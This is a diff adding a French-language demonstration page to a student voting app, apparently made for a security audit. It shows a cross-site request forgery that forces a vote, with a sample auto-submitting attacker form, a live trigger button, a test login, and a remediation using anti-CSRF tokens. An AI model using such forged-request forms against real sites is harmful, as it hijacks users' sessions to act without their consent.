@@ -1,0 +1,76 @@
+﻿<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Démonstration Faille CSRF - VoteNow</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        body { background: #0f172a; color: #f8fafc; font-family: 'Inter', system-ui, sans-serif; padding: 30px 15px; }
+        .card_attack { max-width: 700px; margin: 0 auto; background: #1e293b; border: 2px solid #ef4444; border-radius: 14px; padding: 25px; box-shadow: 0 10px 30px rgba(239,68,68,0.2); }
+        .banner_alert { background: rgba(239,68,68,0.15); border-left: 4px solid #ef4444; padding: 12px 16px; border-radius: 6px; margin-bottom: 20px; }
+        .code_preview { background: #0b1120; border-radius: 8px; padding: 12px; font-family: monospace; font-size: 13px; color: #fca5a5; overflow-x: auto; margin: 15px 0; }
+    </style>
+</head>
+<body>
+    <div class="card_attack">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+            <span style="font-size:12px; text-transform:uppercase; letter-spacing:1px; color:#ef4444; font-weight:700;">
+                <i class="fa-solid fa-triangle-exclamation"></i> Simulation Page Piégée Externe
+            </span>
+            <a href="index.php" style="color:#94a3b8; text-decoration:none; font-size:13px;"><i class="fa-solid fa-arrow-left"></i> Retour VoteNow</a>
+        </div>
+
+        <h2 style="font-size:1.4rem; margin-bottom:8px;">🎯 Démonstration Faille CSRF - Vote Forcé</h2>
+        <p style="color:#94a3b8; font-size:14px; margin-bottom:18px;">
+            Alerte OWASP ZAP : <strong>Absence de Jetons Anti-CSRF (Anti-CSRF Tokens Missing)</strong>
+        </p>
+
+        <div class="banner_alert">
+            <h4 style="color:#ef4444; margin-bottom:4px;"><i class="fa-solid fa-bomb"></i> Scénario d'Exploitation :</h4>
+            <p style="font-size:13px; color:#cbd5e1; line-height:1.5;">
+                Un étudiant légitimement connecté sur <strong>VoteNow</strong> clique sur un lien malveillant ou visite un site externe piégé. 
+                Sans son consentement explicite, le script ci-dessous soumet une requête POST vers <code>/api/votes.php</code> pour forcer son vote en faveur d'un candidat prédéfini !
+            </p>
+        </div>
+
+        <div style="background:#0f172a; padding:15px; border-radius:8px; border:1px solid #334155; margin-bottom:20px;">
+            <h4 style="font-size:14px; color:#38bdf8; margin-bottom:8px;"><i class="fa-solid fa-code"></i> Code HTML/JS du Formulaire Attaquant :</h4>
+            <div class="code_preview">
+&lt;!-- Requête forgée exécutée avec les cookies de session de la victime --&gt;
+&lt;form id="csrfForm" action="http://127.0.0.1:8000/api/votes.php" method="POST"&gt;
+    &lt;input type="hidden" name="election_id" value="1"&gt;
+    &lt;input type="hidden" name="candidature_id" value="1"&gt;
+&lt;/form&gt;
+&lt;script&gt;
+    // Déclenchement automatique de la soumission du vote
+    document.getElementById('csrfForm').submit();
+&lt;/script&gt;
+            </div>
+        </div>
+
+        <div style="text-align:center; padding:10px 0;">
+            <form id="csrfAttackForm" action="api/votes.php" method="POST">
+                <input type="hidden" name="election_id" value="1">
+                <input type="hidden" name="candidature_id" value="1">
+                <button type="submit" class="btn btn_primary btn_lg" style="background:#ef4444; border-color:#dc2626; width:100%; cursor:pointer;">
+                    <i class="fa-solid fa-skull-crossbones"></i> Déclencher l'Attaque CSRF (Simuler le Vote Forcé)
+                </button>
+            </form>
+            <p style="font-size:12px; color:#64748b; margin-top:8px;">
+                *Nécessite d'être préalablement connecté avec un compte électeur (ex: <code>SN-2024-001</code> / <code>test123</code>).
+            </p>
+        </div>
+
+        <hr style="border:0; border-top:1px solid #334155; margin:24px 0;">
+
+        <div style="font-size:13px; color:#94a3b8; line-height:1.6;">
+            <strong style="color:#22c55e;"><i class="fa-solid fa-shield-check"></i> Remédiation Technique :</strong>
+            <p style="margin-top:4px;">
+                Intégrer un jeton de synchronisation anti-CSRF (<strong>Synchronizer Token Pattern</strong>) : chaque formulaire et chaque appel API d'action doit inclure un jeton cryptographiquement imprévisible stocké dans <code>$_SESSION['csrf_token']</code> et validé avec <code>hash_equals()</code> avant tout enregistrement en base.
+            </p>
+        </div>
+    </div>
+</body>
+</html>
